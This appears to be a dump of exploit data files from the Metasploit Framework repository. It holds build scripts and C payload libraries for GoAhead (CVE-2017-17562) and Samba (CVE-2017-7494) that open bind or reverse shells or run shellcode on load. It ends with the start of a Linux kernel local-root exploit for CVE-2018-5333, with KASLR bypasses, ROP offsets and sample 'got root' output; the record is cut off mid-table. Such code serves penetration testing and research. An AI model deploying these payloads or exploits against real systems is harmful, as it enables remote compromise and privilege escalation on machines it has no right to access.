{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-17562/build.sh", "content": "#!/bin/bash\n\nbuild () {\n  CC=$1\n  TARGET_SUFFIX=$2\n  CFLAGS=$3\n\n  echo \"[*] Building for ${TARGET_SUFFIX}...\"\n  for type in {shellcode,system,reverse,bind}\n   do ${CC} ${CFLAGS} -Wall -fPIC -fno-stack-protector -Os goahead-cgi-${type}.c -s -shared -o goahead-cgi-${type}-${TARGET_SUFFIX}.so\n  done\n}\n\nrm -f *.o *.so *.gz\n\n#\n# Linux GLIBC\n#\n\n# x86\nbuild \"gcc\" \"linux-glibc-x86_64\" \"-m64 -D OLD_LIB_SET_2\"\nbuild \"gcc\" \"linux-glibc-x86\" \"-m32 -D OLD_LIB_SET_1\"\n\n# ARM\nbuild \"arm-linux-gnueabi-gcc-5\" \"linux-glibc-armel\" \"-march=armv5 -mlittle-endian\"\nbuild \"arm-linux-gnueabihf-gcc-5\" \"linux-glibc-armhf\" \"-march=armv7 -mlittle-endian\"\nbuild \"aarch64-linux-gnu-gcc-4.9\" \"linux-glibc-aarch64\" \"\"\n\n# MIPS\nbuild \"mips-linux-gnu-gcc-5\" \"linux-glibc-mips\" \"-D OLD_LIB_SET_1\"\nbuild \"mipsel-linux-gnu-gcc-5\"  \"linux-glibc-mipsel\" \"-D OLD_LIB_SET_1\"\nbuild \"mips64-linux-gnuabi64-gcc-5\"  \"linux-glibc-mips64\" \"-D OLD_LIB_SET_1\"\nbuild \"mips64el-linux-gnuabi64-gcc-5\" \"linux-glibc-mips64el\" \"-D OLD_LIB_SET_1\"\n\n# SPARC\nbuild \"sparc64-linux-gnu-gcc-5\" \"linux-glibc-sparc64\" \"\"\nbuild \"sparc64-linux-gnu-gcc-5\" \"linux-glibc-sparc\" \"-m32 -D OLD_LIB_SET_1\"\n\n# PowerPC\nbuild \"powerpc-linux-gnu-gcc-5\" \"linux-glibc-powerpc\" \"-D OLD_LIB_SET_1\"\nbuild \"powerpc64-linux-gnu-gcc-5\" \"linux-glibc-powerpc64\" \"\"\nbuild \"powerpc64le-linux-gnu-gcc-4.9\" \"linux-glibc-powerpc64le\" \"\"\n\n# S390X\nbuild \"s390x-linux-gnu-gcc-5\" \"linux-glibc-s390x\" \"\"\n\ngzip -9 *.so\nrm -f *.o *.so\n", "timestamp": "2025-10-24T23:39:31.522423"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-17562/goahead-cgi-bind.c", "content": "#include <arpa/inet.h>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver system,system@GLIBC_2.0\");\n__asm__(\".symver fork,fork@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver system,system@GLIBC_2.2.5\");\n__asm__(\".symver fork,fork@GLIBC_2.2.5\");\n#endif\n\nstatic void _bind_tcp_shell(void) {\n\n  int sfd, fd, i;\n  struct sockaddr_in addr,saddr;\n  unsigned int saddr_len = sizeof(struct sockaddr_in);\n\n  char *lport = \"55555\";\n  char *shells[] = {\n    \"/bin/bash\",\n    \"/usr/bin/bash\",\n    \"/bin/sh\",\n    \"/usr/bin/sh\",\n    \"/bin/ash\",\n    \"/usr/bin/ash\",\n    \"/bin/dash\",\n    \"/usr/bin/dash\",\n    \"/bin/csh\",\n    \"/usr/bin/csh\",\n    \"/bin/ksh\",\n    \"/usr/bin/ksh\",\n    \"/bin/busybox\",\n    \"/usr/bin/busybox\",\n    NULL\n  };\n\n  sfd = socket(AF_INET, SOCK_STREAM, 0);\n  setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int));\n\n  saddr.sin_family = AF_INET;\n  saddr.sin_port = htons(atoi(lport));\n  saddr.sin_addr.s_addr = INADDR_ANY;\n  bzero(&saddr.sin_zero, 8);\n\n  if (bind(sfd, (struct sockaddr *) &saddr, saddr_len) == -1) {\n    exit(1);\n  }\n\n  if (listen(sfd, 5) == -1) {\n    close(sfd);\n    exit(1);\n  }\n\n  fd = accept(sfd, (struct sockaddr *) &addr, &saddr_len);\n  close(sfd);\n\n  if (fd == -1) {\n    exit(1);\n  }\n\n  for (i=0; i<3; i++) {\n    dup2(fd, i);\n  }\n\n  /* Keep trying until execl() succeeds */\n  for (i=0; ; i++) {\n    if (shells[i] == NULL) break;\n    execl(shells[i], \"sh\", NULL);\n  }\n\n  /* Close the connection if we failed to find a shell */\n  close(fd);\n}\n\nstatic void _run_payload_(void) __attribute__((constructor));\n\nstatic void _run_payload_(void)\n{\n    unsetenv(\"LD_PRELOAD\");\n    if (! fork())\n      _bind_tcp_shell();\n\n    exit(0);\n}\n", "timestamp": "2025-10-24T23:39:31.843010"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-17562/goahead-cgi-reverse.c", "content": "#include <arpa/inet.h>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver system,system@GLIBC_2.0\");\n__asm__(\".symver fork,fork@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver system,system@GLIBC_2.2.5\");\n__asm__(\".symver fork,fork@GLIBC_2.2.5\");\n#endif\n\nstatic void _reverse_tcp_shell(void) {\n\n  int fd, i;\n  struct sockaddr_in addr;\n  char *lport = \"55555\";\n  char *lhost = \"000.000.000.000\";\n  char *shells[] = {\n    \"/bin/bash\",\n    \"/usr/bin/bash\",\n    \"/bin/sh\",\n    \"/usr/bin/sh\",\n    \"/bin/ash\",\n    \"/usr/bin/ash\",\n    \"/bin/dash\",\n    \"/usr/bin/dash\",\n    \"/bin/csh\",\n    \"/usr/bin/csh\",\n    \"/bin/ksh\",\n    \"/usr/bin/ksh\",\n    \"/bin/busybox\",\n    \"/usr/bin/busybox\",\n    NULL\n  };\n\n  fd = socket(PF_INET, SOCK_STREAM, 0);\n  addr.sin_port = htons(atoi(lport));\n  addr.sin_addr.s_addr = inet_addr(lhost);\n  addr.sin_family = AF_INET;\n\n  memset(addr.sin_zero, 0, sizeof(addr.sin_zero));\n\n  for (i=0; i<10; i++) {\n    if (! connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {\n      break;\n    }\n  }\n\n  for (i=0; i<3; i++) {\n    dup2(fd, i);\n  }\n\n  /* Keep trying until execl() succeeds */\n  for (i=0; ; i++) {\n    if (shells[i] == NULL) break;\n    execl(shells[i], \"sh\", NULL);\n  }\n\n  /* Close the connection if we failed to find a shell */\n  close(fd);\n}\n\nstatic void _run_payload_(void) __attribute__((constructor));\n\nstatic void _run_payload_(void)\n{\n    unsetenv(\"LD_PRELOAD\");\n    if (! fork())\n      _reverse_tcp_shell();\n\n    exit(0);\n}\n", "timestamp": "2025-10-24T23:39:32.164037"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-17562/goahead-cgi-shellcode.c", "content": "#include <stdio.h>\n#include <stdbool.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <signal.h>\n#include <stdlib.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver mmap,mmap@GLIBC_2.0\");\n__asm__(\".symver memcpy,memcpy@GLIBC_2.0\");\n__asm__(\".symver fork,fork@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver mmap,mmap@GLIBC_2.2.5\");\n__asm__(\".symver memcpy,memcpy@GLIBC_2.2.5\");\n__asm__(\".symver fork,fork@GLIBC_2.2.5\");\n#endif\n\n#define PAYLOAD_SIZE 5000\nunsigned char payload[PAYLOAD_SIZE] = {'P','A','Y','L','O','A','D',0};\n\nstatic void _run_payload_(void) __attribute__((constructor));\n\nstatic void _run_payload_(void)\n{\n  void *mem;\n  void (*fn)();\n\n  unsetenv(\"LD_PRELOAD\");\n\n  mem = mmap(NULL, PAYLOAD_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);\n  if (mem == MAP_FAILED)\n    return;\n\n  memcpy(mem, payload, PAYLOAD_SIZE);\n  fn = (void(*)())mem;\n\n  if (! fork())\n    fn();\n\n  exit(0);\n}\n", "timestamp": "2025-10-24T23:39:32.492808"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-17562/goahead-cgi-system.c", "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <stdlib.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver system,system@GLIBC_2.0\");\n__asm__(\".symver fork,fork@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver system,system@GLIBC_2.2.5\");\n__asm__(\".symver fork,fork@GLIBC_2.2.5\");\n#endif\n\n#define PAYLOAD_SIZE 5000\nunsigned char payload[PAYLOAD_SIZE] = {'P','A','Y','L','O','A','D',0};\n\nstatic void _run_payload_(void) __attribute__((constructor));\n\nstatic void _run_payload_(void)\n{\n    int dummy = 0;\n    unsetenv(\"LD_PRELOAD\");\n    if (! fork())\n      dummy = system((const char*)payload);\n\n    exit(dummy);\n}\n", "timestamp": "2025-10-24T23:39:32.809632"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-17562/install-deps.sh", "content": "#!/bin/bash\n\n# Assume x86_64 Ubuntu 16.04 base system\napt-get install build-essential \\\n  gcc-5-multilib \\\n  gcc-5-multilib-arm-linux-gnueabi \\\n  gcc-5-multilib-arm-linux-gnueabihf \\\n  gcc-5-multilib-mips-linux-gnu \\\n  gcc-5-multilib-mips64-linux-gnuabi64 \\\n  gcc-5-multilib-mips64el-linux-gnuabi64 \\\n  gcc-5-multilib-mipsel-linux-gnu \\\n  gcc-5-multilib-powerpc-linux-gnu \\\n  gcc-5-multilib-powerpc64-linux-gnu \\\n  gcc-5-multilib-s390x-linux-gnu \\\n  gcc-5-multilib-sparc64-linux-gnu \\\n  gcc-4.9-powerpc64le-linux-gnu \\\n  gcc-4.9-aarch64-linux-gnu\n\nif [ ! -e /usr/include/asm ];\n  then ln -sf /usr/include/asm-generic /usr/include/asm\nfi\n", "timestamp": "2025-10-24T23:39:33.126209"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-7494/build.sh", "content": "#!/bin/bash\n\nbuild () {\n  CC=$1\n  TARGET_SUFFIX=$2\n  CFLAGS=$3\n\n  echo \"[*] Building for ${TARGET_SUFFIX}...\"\n  for type in {shellcode,system,findsock}\n   do ${CC} ${CFLAGS} -Wall -Werror -fPIC -fno-stack-protector samba-root-${type}.c -shared -o samba-root-${type}-${TARGET_SUFFIX}.so\n  done\n}\n\nrm -f *.o *.so *.gz\n\n#\n# Linux GLIBC\n#\n\n# x86\nbuild \"gcc\" \"linux-glibc-x86_64\" \"-m64 -D OLD_LIB_SET_2\"\nbuild \"gcc\" \"linux-glibc-x86\" \"-m32 -D OLD_LIB_SET_1\"\n\n# ARM\nbuild \"arm-linux-gnueabi-gcc-5\" \"linux-glibc-armel\" \"-march=armv5 -mlittle-endian\"\nbuild \"arm-linux-gnueabihf-gcc-5\" \"linux-glibc-armhf\" \"-march=armv7 -mlittle-endian\"\nbuild \"aarch64-linux-gnu-gcc-4.9\" \"linux-glibc-aarch64\" \"\"\n\n# MIPS\nbuild \"mips-linux-gnu-gcc-5\" \"linux-glibc-mips\" \"-D OLD_LIB_SET_1\"\nbuild \"mipsel-linux-gnu-gcc-5\"  \"linux-glibc-mipsel\" \"-D OLD_LIB_SET_1\"\nbuild \"mips64-linux-gnuabi64-gcc-5\"  \"linux-glibc-mips64\" \"-D OLD_LIB_SET_1\"\nbuild \"mips64el-linux-gnuabi64-gcc-5\" \"linux-glibc-mips64el\" \"-D OLD_LIB_SET_1\"\n\n# SPARC\nbuild \"sparc64-linux-gnu-gcc-5\" \"linux-glibc-sparc64\" \"\"\nbuild \"sparc64-linux-gnu-gcc-5\" \"linux-glibc-sparc\" \"-m32 -D OLD_LIB_SET_1\"\n\n# PowerPC\nbuild \"powerpc-linux-gnu-gcc-5\" \"linux-glibc-powerpc\" \"-D OLD_LIB_SET_1\"\nbuild \"powerpc64-linux-gnu-gcc-5\" \"linux-glibc-powerpc64\" \"\"\nbuild \"powerpc64le-linux-gnu-gcc-4.9\" \"linux-glibc-powerpc64le\" \"\"\n\n# S390X\nbuild \"s390x-linux-gnu-gcc-5\" \"linux-glibc-s390x\" \"\"\n\ngzip -9 *.so\nrm -f *.o *.so\n", "timestamp": "2025-10-24T23:39:33.453773"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-7494/samba-root-findsock.c", "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <signal.h>\n#include <string.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver execve,execve@GLIBC_2.0\");\n__asm__(\".symver dup2,dup2@GLIBC_2.0\");\n__asm__(\".symver getsockname,getsockname@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver execve,execve@GLIBC_2.2.5\");\n__asm__(\".symver dup2,dup2@GLIBC_2.2.5\");\n__asm__(\".symver getsockname,getsockname@GLIBC_2.2.5\");\n#endif\n\nextern bool change_to_root_user(void);\n\n// Samba 4 looks for samba_init_module\nint samba_init_module(void)\n{\n  char *args[2] = {\"/bin/sh\", 0};\n  struct sockaddr_in sa;\n  socklen_t sl = sizeof(sa);\n  int s;\n  unsigned char buff[] = {\n    0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,\n    0xa2, 0x39, 0x00, 0x00, 0xc0, 0x88, 0x03, 0xc8,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x64, 0x7e,\n    0x64, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00\n  };\n\n  change_to_root_user();\n\n  for (s=4096; s>0; s--) {\n\n    // Skip over invalid sockets\n    if (getsockname(s, (struct sockaddr *)&sa, &sl) != 0)\n      continue;\n\n    // Skip over non internet sockets\n    if (sa.sin_family != AF_INET)\n      continue;\n\n    // Send a semi-valid SMB response to simplify things\n    send(s, buff, sizeof(buff), 0);\n\n    // Duplicate standard input/output/error\n    dup2(s, 0);\n    dup2(s, 1);\n    dup2(s, 2);\n\n    execve(args[0], args, NULL);\n  }\n\n  return 0;\n}\n\n// Samba 3 looks for init_samba_module\nint init_samba_module(void) {  return samba_init_module(); }\n", "timestamp": "2025-10-24T23:39:34.157643"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-7494/samba-root-shellcode.c", "content": "#include <stdio.h>\n#include <stdbool.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <signal.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver mmap,mmap@GLIBC_2.0\");\n__asm__(\".symver memcpy,memcpy@GLIBC_2.0\");\n__asm__(\".symver fork,fork@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver mmap,mmap@GLIBC_2.2.5\");\n__asm__(\".symver memcpy,memcpy@GLIBC_2.2.5\");\n__asm__(\".symver fork,fork@GLIBC_2.2.5\");\n#endif\n\n#define PAYLOAD_SIZE 10000\nunsigned char payload[PAYLOAD_SIZE] = {'P','A','Y','L','O','A','D',0};\n\nextern bool change_to_root_user(void);\n\n// Samba 4 looks for samba_init_module\nint samba_init_module(void)\n{\n  void *mem;\n  void (*fn)();\n\n  change_to_root_user();\n  mem = mmap(NULL, PAYLOAD_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);\n  if (mem == MAP_FAILED)\n    return 0;\n\n  memcpy(mem, payload, PAYLOAD_SIZE);\n  fn = (void(*)())mem;\n\n  if (! fork()) {\n    fn();\n    kill(getpid(), 9);\n  }\n  return 0;\n}\n\n// Samba 3 looks for init_samba_module\nint init_samba_module(void) {  return samba_init_module(); }\n", "timestamp": "2025-10-24T23:39:34.489032"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-7494/samba-root-system.c", "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <string.h>\n\n#ifdef OLD_LIB_SET_1\n__asm__(\".symver system,system@GLIBC_2.0\");\n__asm__(\".symver fork,fork@GLIBC_2.0\");\n#endif\n\n#ifdef OLD_LIB_SET_2\n__asm__(\".symver system,system@GLIBC_2.2.5\");\n__asm__(\".symver fork,fork@GLIBC_2.2.5\");\n#endif\n\n#define PAYLOAD_SIZE 10000\nunsigned char payload[PAYLOAD_SIZE] = {'P','A','Y','L','O','A','D',0};\n\nextern bool change_to_root_user(void);\n\n// Samba 4 looks for samba_init_module\nint samba_init_module(void)\n{\n  change_to_root_user();\n  if (! fork()) {\n    system((const char*)payload);\n  }\n  return 0;\n}\n\n// Samba 3 looks for init_samba_module\nint init_samba_module(void) {  return samba_init_module(); }\n", "timestamp": "2025-10-24T23:39:34.819285"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2018-5333/cve-2018-5333.c", "content": "// Local root exploit for Linux RDS rds_atomic_free_op NULL pointer dereference\n// in the rds kernel module in the Linux kernel through 4.14.13 (CVE-2018-5333).\n//\n// Includes KASLR, SMEP, and mmap_min_addr bypasses. No SMAP bypass.\n//\n// Targets:\n// - Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116\n// - Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54\n//\n// The rds kernel module is not loaded by default on Ubuntu, and is blacklisted\n// in /etc/modprobe.d/blacklist-rare-network.conf to prevent autoloading.\n// - install: sudo apt install \"linux-image-extra-$(uname -r)-generic\"\n// - load:    sudo insmod \"/lib/modules/$(uname -r)/kernel/net/rds/rds.ko\"\n//\n// This exploit is a modified extension of the original local root\n// proof of concept exploit written by wbowling as an example of using\n// CVE-2019-9213 to make previous kernel bugs exploitable:\n// - https://gist.github.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4\n//\n// The original exploit is based on the null pointer dereference\n// reproducer proof of concept and analysis by 0x36:\n// - https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c\n//\n// wbowling has done most of the hard work, by utilising Jann Horn's\n// mmap_min_addr bypass technique (CVE-2019-9213), allowing userland to mmap\n// virtual address 0 (without which this bug would not be exploitable on\n// systems with a sufficiently large value for vm.mmap_min_addr);\n// and developing the appropriate ROP chain.\n// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2\n//\n// This exploit adds offsets for additional kernels, and introduces some\n// additional features, such as KASLR bypasses and system checks, including:\n// - check if system supports SMAP\n// - check if system supports RDS sockets\n// - Jann Horn's mincore KASLR bypass via heap page disclosure (CVE-2017-16994)\n//   - https://bugs.chromium.org/p/project-zero/issues/detail?id=1431\n// - spender's /proc/kallsyms KASLR bypass (requires kernel.kptr_restrict=0)\n//   - https://grsecurity.net/~spender/exploits/exploit.txt\n// - xairy's syslog KASLR bypass (requires kernel.dmesg_restrict=0)\n//   - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c\n// - lizzie's perf_event_open KASLR bypass (requires kernel.perf_event_paranoid<2)\n//   - https://blog.lizzie.io/kaslr-and-perf.html\n//\n// Shoutout to nstarke for adding additional kernel offsets.\n// - https://github.com/bcoles/kernel-exploits/pulls?q=author:nstarke+cve-2018-5333\n//\n// This exploit also uses various code patterns copied from:\n// - xairy's exploits:\n//   - https://github.com/xairy/kernel-exploits\n// - vnik's kernel ROP code:\n//   - https://github.com/vnik5287/kernel_rop\n// ---\n// $ gcc cve-2018-5333.c -o cve-2018-5333 -Wall\n// $ ./cve-2018-5333\n// Linux RDS rds_atomic_free_op NULL pointer dereference local root (CVE-2018-5333)\n// [.] checking kernel version...\n// [.] kernel version '4.4.0-116-generic #140-Ubuntu' detected\n// [~] done, version looks good\n// [.] checking system...\n// [~] done, looks good\n// [.] mapping null address...\n// [~] done, mapped null address\n// [.] KASLR bypass enabled, getting kernel base address\n// [.] trying /proc/kallsyms...\n// [-] kernel base not found in /proc/kallsyms\n// [.] trying syslog...\n// [-] kernel base not found in syslog\n// [.] trying perf_event_open sampling...\n// [.] done, kernel text:   ffffffff9f000000\n// [.] commit_creds:        ffffffff9f0a4cf0\n// [.] prepare_kernel_cred: ffffffff9f0a50e0\n// [.] mmapping fake stack...\n// [~] done, fake stack mmapped\n// [.] executing payload 0x402119...\n// [+] got root\n// # id\n// uid=0(root) gid=0(root) groups=0(root)\n// ---\n// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-5333\n// <bcoles@gmail.com>\n\n#define _GNU_SOURCE\n\n#include <fcntl.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <linux/perf_event.h>\n#include <netinet/in.h>\n#include <sys/ioctl.h>\n#include <sys/klog.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <sys/stat.h>\n#include <sys/syscall.h>\n#include <sys/types.h>\n#include <sys/utsname.h>\n\n#define DEBUG\n\n#ifdef DEBUG\n#  define dprintf printf\n#else\n#  define dprintf\n#endif\n\n#define ENABLE_SYSTEM_CHECKS            1\n#define ENABLE_KASLR_BYPASS             1\n\n#if ENABLE_KASLR_BYPASS\n#  define KERNEL_BASE_MIN               0xffffffff00000000ul\n#  define KERNEL_BASE_MAX               0xffffffffff000000ul\n#  define ENABLE_KASLR_BYPASS_KALLSYMS  1\n#  define ENABLE_KASLR_BYPASS_SYSLOG    1\n#  define ENABLE_KASLR_BYPASS_PERF      1\n#  define ENABLE_KASLR_BYPASS_MINCORE   1\n#endif\n\n// Can be overwritten by argv[1]\nchar *SHELL = \"/bin/sh\";\n\n// Will be overwritten if ENABLE_KASLR_BYPASS is enabled (1)\nunsigned long KERNEL_BASE = 0xffffffff81000000ul;\n\n// Will be overwritten by detect_versions().\nint kernel = -1;\n\n// kernel target struct, using ROP chain from wbowling's exploit\nstruct kernel_info {\n  const char* kernel_version;\n  uint64_t commit_creds;\n  uint64_t prepare_kernel_cred;\n  uint64_t xor_rdi;     //: xor edi, edi ; ret\n  uint64_t mov_rdi_rax; //: mov rdi, rax ; pop rbx ; mov rax, rdi ; pop r12 ; pop rbp ; ret\n  uint64_t xchg_esp;    //: xchg eax, esp ; shr bl, 0xbf ; xor eax, eax ; pop rbp ; ret\n  uint64_t swapgs;      //: swapgs ; pop rbp ; ret\n  uint64_t iretq;       //: iretq\n};\n\n// Targets\nstruct kernel_info kernels[] = {\n  { \"4.4.0-21-generic #37-Ubuntu\",   0xa21c0, 0xa25b0, 0x5d0c5, 0x178157, 0x3f8158, 0x64644, 0x4cc7da },\n  { \"4.4.0-22-generic #40-Ubuntu\",   0xa2220, 0xa2610, 0x5d0c5, 0x178217, 0x3f89e8, 0x64644, 0x7d005  },\n  { \"4.4.0-24-generic #43-Ubuntu\",   0xa2340, 0xa2730, 0x5d0c5, 0x178447, 0x3f98b8, 0x64644, 0x7d125  },\n  { \"4.4.0-28-generic #47-Ubuntu\",   0xa24a0, 0xa2890, 0x5d0c5, 0x178717, 0x3f9f38, 0x64644, 0x585dc  },\n  { \"4.4.0-31-generic #50-Ubuntu\",   0xa24a0, 0xa2890, 0x5d0c5, 0x1787a7, 0x3ffed8, 0x64644, 0x7d125  },\n  { \"4.4.0-38-generic #57-Ubuntu\",   0xa2570, 0xa2960, 0x5d0c5, 0x178a97, 0x400968, 0x64634, 0x7d1e5  },\n  { \"4.4.0-42-generic #62-Ubuntu\",   0xa25c0, 0xa29b0, 0x5d0c5, 0x178ac7, 0x400d78, 0x64634, 0x7d1a5  },\n  { \"4.4.0-98-generic #121-Ubuntu\",  0xa2850, 0xa2c40, 0x5d0c5, 0x17a427, 0x40a138, 0x64694, 0x4b243  },\n  { \"4.4.0-108-generic #131-Ubuntu\", 0xa3420, 0xa3810, 0x5d0c5, 0x17af37, 0x40aa98, 0x646a4, 0x7dd35  },\n  { \"4.4.0-109-generic #132-Ubuntu\", 0xa3420, 0xa3810, 0x5d0c5, 0x17af37, 0x40aa98, 0x646a4, 0x7dd35  },\n  { \"4.4.0-112-generic #135-Ubuntu\", 0xa3a90, 0xa3e80, 0x5d0c5, 0x17b657, 0x40b238, 0x646a4, 0x54137c },\n  { \"4.4.0-116-generic #140-Ubuntu\", 0xa4cf0, 0xa50e0, 0x5e0c5, 0x17d5d7, 0x40ed08, 0x65734, 0x3a5b04 },\n\n  /* Untested:\n  { \"4.4.0-51-generic #72-Ubuntu\",   0xa2670, 0xa2a60, 0x5d0c5, 0x178cf7, 0x404d78, 0x64634, 0x7d1a5  },\n  { \"4.4.0-62-generic #83-Ubuntu\",   0xa2840, 0xa2c30, 0x5d0c5, 0x179747, 0x406a78, 0x64634, 0x7d1e5  },\n  { \"4.4.0-63-generic #84-Ubuntu\",   0xa2840, 0xa2c30, 0x5d0c5, 0x179827, 0x406e98, 0x64634, 0x406eb  },\n  { \"4.4.0-66-generic #87-Ubuntu\",   0xa2840, 0xa2c30, 0x5d0c5, 0x179827, 0x406e98, 0x64634, 0x406eb  },\n  { \"4.4.0-70-generic #91-Ubuntu\",   0xa27b0, 0xa2ba0, 0x5d0c5, 0x179847, 0x4070c8, 0x64664, 0x406eb  },\n  { \"4.4.0-79-generic #100-Ubuntu\",  0xa2800, 0xa2bf0, 0x5d0c5, 0x179a67, 0x408338, 0x64664, 0x7d235  },\n  { \"4.4.0-87-generic #110-Ubuntu\",  0xa2860, 0xa2c50, 0x5d0c5, 0x179ca7, 0x408768, 0x64694, 0x7d285  },\n  { \"4.4.0-89-generic #112-Ubuntu\",  0xa28a0, 0xa2c90, 0x5d0c5, 0x179d27, 0x408ae8, 0x64694, 0x7d265  },\n  { \"4.4.0-96-generic #119-Ubuntu\",  0xa28c0, 0xa2cb0, 0x5d0c5, 0x179e27, 0x409a48, 0x64694, 0x7d235  },\n  { \"4.4.0-97-generic #120-Ubuntu\",  0xa2850, 0xa2c40, 0x5d0c5, 0x179e47, 0x409a58, 0x64694, 0x4ed41  },\n  */\n\n  { \"4.4.0-21-lowlatency #37-Ubuntu\",   0xa3150, 0xa3560, 0x5e0c5, 0x17b2c7, 0x401288, 0x64d34, 0x7d95c },\n  { \"4.4.0-22-lowlatency #40-Ubuntu\",   0xa31c0, 0xa35d0, 0x5e0c5, 0x17b397, 0x401b48, 0x64d34, 0x7d9bc },\n  { \"4.4.0-24-lowlatency #43-Ubuntu\",   0xa32e0, 0xa36f0, 0x5e0c5, 0x17b5e7, 0x402958, 0x64d34, 0x7dadc },\n  { \"4.4.0-28-lowlatency #47-Ubuntu\",   0xa3450, 0xa3860, 0x5e0c5, 0x17b8c7, 0x402f48, 0x64d34, 0x7dadc },\n  //{ \"4.4.0-31-lowlatency #50-Ubuntu\",   0xa3450, 0xa3860, 0x5e0c5, 0x17b9a7, 0x409018, 0x64d34, 0x7dadc },\n  //{ \"4.4.0-34-lowlatency #53-Ubuntu\",   0xa3450, 0xa3860, 0x5e0c5, 0x17b9a7, 0x409088, 0x64d34, 0x7dadc },\n  { \"4.4.0-36-lowlatency #55-Ubuntu\",   0xa3430, 0xa3840, 0x5e0c5, 0x17b9e7, 0x409318, 0x64d24, 0x7dacc },\n  { \"4.4.0-38-lowlatency #57-Ubuntu\",   0xa3500, 0xa3910, 0x5e0c5, 0x17bcb7, 0x409b38, 0x64d24, 0x4c030 },\n  { \"4.4.0-42-lowlatency #62-Ubuntu\",   0xa3560, 0xa3970, 0x5e0c5, 0x17bcf7, 0x409f68, 0x64d24, 0x7db6c },\n  { \"4.4.0-98-lowlatency #121-Ubuntu\",  0xa38c0, 0xa3cd0, 0x5e0c5, 0x17d737, 0x413408, 0x64d84, 0x24454 },\n  { \"4.4.0-109-lowlatency #132-Ubuntu\", 0xa5530, 0xa5940, 0x5f0c5, 0x17f257, 0x414c18, 0x65d94, 0x7f7ac },\n  { \"4.4.0-112-lowlatency #135-Ubuntu\", 0xa5bd0, 0xa5fe0, 0x5f0c5, 0x17f9a7, 0x415448, 0x65d94, 0x7f8dc },\n  { \"4.4.0-116-lowlatency #140-Ubuntu\", 0xa6e00, 0xa7210, 0x600c5, 0x1818f7, 0x418a38, 0x66de4, 0x809ef },\n\n  { \"4.8.0-34-generic #36~16.04.1-Ubuntu\", 0xa5d50, 0xa6140, 0x5d0c5, 0x1876d7, 0x43d208, 0x642f4, 0x7ed2b },\n  { \"4.8.0-36-generic #36~16.04.1-Ubuntu\", 0xa5d50, 0xa6140, 0x5d0c5, 0x1876d7, 0x43d208, 0x642f4, 0x7ed2b },\n  { \"4.8.0-39-generic #42~16.04.1-Ubuntu\", 0xa5cf0, 0xa60e0, 0x5d0c5, 0x187767, 0x43da98, 0x642f4, 0x7ed2b },\n  { 